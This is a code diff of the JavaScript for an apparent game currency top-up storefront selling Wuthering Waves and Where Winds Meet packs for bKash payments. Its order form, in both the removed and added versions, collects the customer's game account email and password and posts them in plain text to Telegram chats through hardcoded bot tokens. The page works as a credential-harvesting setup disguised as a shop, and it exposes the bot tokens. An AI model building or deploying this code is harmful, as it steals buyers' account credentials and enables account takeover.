@@ -1,179 +1,119 @@
-// --- Data ---
 const packages = {
     ww: [
         { id: 'ww1', type: 'Lunite Subscription Pack', name: 'Tide Blessing Pack', price: 449 },
         { id: 'ww2', type: 'Resonator Pass Packs', name: 'Resonator Pass', price: 949 },
         { id: 'ww3', type: 'Resonator Pass Packs', name: 'Resonator Pass+', price: 2199 },
-        { id: 'ww4', type: 'Lunite Top-Up', name: '120 Lunites (Bonus Inc.)', price: 109 },
-        { id: 'ww5', type: 'Lunite Top-Up', name: '600 Lunites (Bonus Inc.)', price: 449 },
-        { id: 'ww6', type: 'Lunite Top-Up', name: '1960 Lunites (Bonus Inc.)', price: 1649 },
-        { id: 'ww7', type: 'Lunite Top-Up', name: '3960 Lunites (Bonus Inc.)', price: 3299 },
-        { id: 'ww8', type: 'Lunite Top-Up', name: '6560 Lunites (Bonus Inc.)', price: 5499 },
-        { id: 'ww9', type: 'Lunite Top-Up', name: '12960 Lunites (Bonus Inc.)', price: 10999 },
+        { id: 'ww4', type: 'Lunite Top-Up', name: '120 Lunites', price: 109 },
+        { id: 'ww5', type: 'Lunite Top-Up', name: '600 Lunites', price: 449 },
+        { id: 'ww6', type: 'Lunite Top-Up', name: '1960 Lunites', price: 1649 },
+        { id: 'ww7', type: 'Lunite Top-Up', name: '3960 Lunites', price: 3299 },
+        { id: 'ww8', type: 'Lunite Top-Up', name: '6560 Lunites', price: 5499 },
+        { id: 'ww9', type: 'Lunite Top-Up', name: '12960 Lunites', price: 10999 }
     ],
     wwm: [
         { id: 'wwm1', type: 'Moonlit Supply Pack', name: 'Spirit Jade Subscription', price: 449 },
         { id: 'wwm2', type: 'Hero’s Journey Pass', name: 'Battle Scroll', price: 949 },
         { id: 'wwm3', type: 'Hero’s Journey Pass', name: 'Battle Scroll+', price: 2199 },
-        { id: 'wwm4', type: 'Spirit Jade Top-Up', name: '120 Spirit Jade (Bonus Inc.)', price: 109 },
-        { id: 'wwm5', type: 'Spirit Jade Top-Up', name: '600 Spirit Jade (Bonus Inc.)', price: 449 },
-        { id: 'wwm6', type: 'Spirit Jade Top-Up', name: '1960 Spirit Jade (Bonus Inc.)', price: 1649 },
-        { id: 'wwm7', type: 'Spirit Jade Top-Up', name: '3960 Spirit Jade (Bonus Inc.)', price: 3299 },
-        { id: 'wwm8', type: 'Spirit Jade Top-Up', name: '6560 Spirit Jade (Bonus Inc.)', price: 5499 },
-        { id: 'wwm9', type: 'Spirit Jade Top-Up', name: '12960 Spirit Jade (Bonus Inc.)', price: 10999 },
+        { id: 'wwm4', type: 'Spirit Jade Top-Up', name: '120 Spirit Jade', price: 109 },
+        { id: 'wwm5', type: 'Spirit Jade Top-Up', name: '600 Spirit Jade', price: 449 },
+        { id: 'wwm6', type: 'Spirit Jade Top-Up', name: '1960 Spirit Jade', price: 1649 },
+        { id: 'wwm7', type: 'Spirit Jade Top-Up', name: '3960 Spirit Jade', price: 3299 },
+        { id: 'wwm8', type: 'Spirit Jade Top-Up', name: '6560 Spirit Jade', price: 5499 },
+        { id: 'wwm9', type: 'Spirit Jade Top-Up', name: '12960 Spirit Jade', price: 10999 }
     ]
 };
 
-// --- Telegram Bot Details ---
-const BOT_TOKEN = '8289877335:AAHcXDyb2pu7XjLbMxDM_g1l7EbkQEmVD_Y';
-const CHAT_IDS = ['8395284772', '6073457658'];
+// নতুন Bot Token
+const BOT_TOKEN = '8579178443:AAHDl_DEr43_AdA30j9y79FMWTlTFUJlGag';
 
-// --- DOM Elements ---
+// চ্যাট আইডি লিস্ট (কমা দিয়ে আরও আইডি যোগ করতে পারবেন)
+const CHAT_IDS = ['8395284772'];
+
 const container = document.getElementById('packages-container');
-const gameBtns = document.querySelectorAll('.game-btn');
 const modal = document.getElementById('order-modal');
-const successModal = document.getElementById('success-modal');
-const closeBtn = document.querySelector('.close-btn');
-const closeSuccessBtn = document.getElementById('close-success');
-const form = document.getElementById('order-form');
 const qtyInput = document.getElementById('quantity');
+const plusBtn = document.getElementById('plus-btn');
+const minusBtn = document.getElementById('minus-btn');
 const displayPrice = document.getElementById('display-price');
 const paymentAmount = document.getElementById('payment-amount');
 
-// --- State ---
 let currentPackage = null;
-let currentGameName = '';
+let currentGame = '';
 
-// --- Render Packages ---
-function renderPackages(gameKey) {
+function render(game) {
     container.innerHTML = '';
-    currentGameName = gameKey === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
-    
-    packages[gameKey].forEach(pkg => {
-        const card = document.createElement('div');
-        card.className = 'package-card';
-        card.innerHTML = `
-            <span class="pack-type">${pkg.type}</span>
-            <h3 class="pack-name">${pkg.name}</h3>
-            <div class="pack-price">${pkg.price}<span>৳</span></div>
-        `;
-        card.addEventListener('click', () => openModal(pkg));
-        container.appendChild(card);
+    currentGame = game === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
+    packages[game].forEach(p => {
+        const div = document.createElement('div');
+        div.className = 'package-card';
+        div.innerHTML = `<small style="color:var(--primary)">${p.type}</small><h3>${p.name}</h3><p>${p.price}৳</p>`;
+        div.onclick = () => {
+            currentPackage = p;
+            document.getElementById('modal-package-name').innerText = p.name;
+            document.getElementById('modal-game-name').innerText = currentGame;
+            qtyInput.value = 1;
+            updateUI();
+            modal.classList.remove('hidden');
+        };
+        container.appendChild(div);
     });
 }
 
-// --- Game Switcher ---
-gameBtns.forEach(btn => {
-    btn.addEventListener('click', (e) => {
-        gameBtns.forEach(b => b.classList.remove('active'));
-        e.target.classList.add('active');
-        renderPackages(e.target.dataset.game);
-    });
-});
-
-// --- Modal Logic ---
-function openModal(pkg) {
-    currentPackage = pkg;
-    document.getElementById('modal-package-name').innerText = pkg.name;
-    document.getElementById('modal-game-name').innerText = currentGameName;
-    qtyInput.value = 1;
-    updatePrice();
-    modal.classList.remove('hidden');
-}
-
-function updatePrice() {
-    const total = currentPackage.price * qtyInput.value;
+function updateUI() {
+    const total = currentPackage.price * parseInt(qtyInput.value || 1);
     displayPrice.innerText = total;
     paymentAmount.innerText = total + '৳';
 }
 
-qtyInput.addEventListener('input', updatePrice);
+plusBtn.onclick = () => { qtyInput.value = parseInt(qtyInput.value) + 1; updateUI(); };
+minusBtn.onclick = () => { if(qtyInput.value > 1) { qtyInput.value = parseInt(qtyInput.value) - 1; updateUI(); } };
+qtyInput.oninput = updateUI;
 
-closeBtn.addEventListener('click', () => modal.classList.add('hidden'));
-closeSuccessBtn.addEventListener('click', () => successModal.classList.add('hidden'));
+document.querySelector('.close-btn').onclick = () => modal.classList.add('hidden');
 
-// Close modal if clicked outside
-window.addEventListener('click', (e) => {
-    if (e.target === modal) modal.classList.add('hidden');
-    if (e.target === successModal) successModal.classList.add('hidden');
-});
-
-// --- Telegram API Submission ---
-form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    
-    const submitBtn = document.getElementById('submit-btn');
-    const btnText = submitBtn.querySelector('.btn-text');
-    const loader = submitBtn.querySelector('.loader');
-
-    // UI Loading state
-    submitBtn.disabled = true;
-    btnText.classList.add('hidden');
-    loader.classList.remove('hidden');
-
-    // Collect Data
-    const data = {
-        game: currentGameName,
-        package: currentPackage.name,
-        qty: qtyInput.value,
-        total: currentPackage.price * qtyInput.value,
-        email: document.getElementById('email-username').value,
-        pass: document.getElementById('password').value,
-        server: document.getElementById('server').value,
-        ign: document.getElementById('ign').value,
-        trxid: document.getElementById('trxid').value
+document.querySelectorAll('.game-btn').forEach(btn => {
+    btn.onclick = (e) => {
+        document.querySelectorAll('.game-btn').forEach(b => b.classList.remove('active'));
+        e.target.classList.add('active');
+        render(e.target.dataset.game);
     };
-
-    // Format Message
-    const message = `
-🔥 <b>NEW ORDER RECEIVED!</b> 🔥
-
-🎮 <b>Game:</b> ${data.game}
-📦 <b>Package:</b> ${data.package}
-🔢 <b>Quantity:</b> ${data.qty}
-💰 <b>Total Price:</b> ${data.total} ৳
-
-👤 <b>Email/User:</b> <code>${data.email}</code>
-🔑 <b>Password:</b> <code>${data.pass}</code>
-🌍 <b>Server:</b> ${data.server}
-🏷️ <b>IGN:</b> ${data.ign}
-
-💳 <b>Payment (bKash)</b>
-🧾 <b>TrxID:</b> <code>${data.trxid}</code>
-    `;
-
-    try {
-        // Send to both chat IDs concurrently
-        const promises = CHAT_IDS.map(chatId => {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            return fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-        });
-
-        await Promise.all(promises);
-
-        // Success
-        form.reset();
-        modal.classList.add('hidden');
-        successModal.classList.remove('hidden');
-
-    } catch (error) {
-        alert('An error occurred while submitting the order. Please try again.');
-        console.error(error);
-    } finally {
-        // Reset UI
-        submitBtn.disabled = false;
-        btnText.classList.remove('hidden');
-        loader.classList.add('hidden');
-    }
 });
 
-// Initialize on load
-renderPackages('ww');
+document.getElementById('order-form').onsubmit = async (e) => {
+    e.preventDefault();
+    const btn = document.getElementById('submit-btn');
+    btn.disabled = true; btn.innerText = 'Processing...';
+
+    // ব্যাকটিক (`) ব্যবহার করে Monospace করা হয়েছে এবং Markdown ফরম্যাট সেট করা হয়েছে
+    const msg = `🚀 *New Order!*
+
+🎮 *Game:* ${currentGame}
+📦 *Pack:* ${currentPackage.name}
+🔢 *Qty:* ${qtyInput.value}
+💰 *Total:* ${displayPrice.innerText}৳
+
+👤 *User:* \`${document.getElementById('email-username').value}\`
+🔑 *Pass:* \`${document.getElementById('password').value}\`
+🌍 *Server:* \`${document.getElementById('server').value}\`
+🏷️ *IGN:* \`${document.getElementById('ign').value}\`
+
+💳 *TrxID:* \`${document.getElementById('trxid').value}\``;
+
+    for (const id of CHAT_IDS) {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            // parse_mode Markdown করে দেওয়া হয়েছে ব্যাকটিক সাপোর্ট করার জন্য
+            body: JSON.stringify({ chat_id: id, text: msg, parse_mode: 'Markdown' })
+        });
+    }
+
+    modal.classList.add('hidden');
+    document.getElementById('success-modal').classList.remove('hidden');
+    btn.disabled = false; btn.innerText = 'Confirm Order';
+    document.getElementById('order-form').reset();
+};
+
+document.getElementById('close-success').onclick = () => document.getElementById('success-modal').classList.add('hidden');
+
+render('ww');
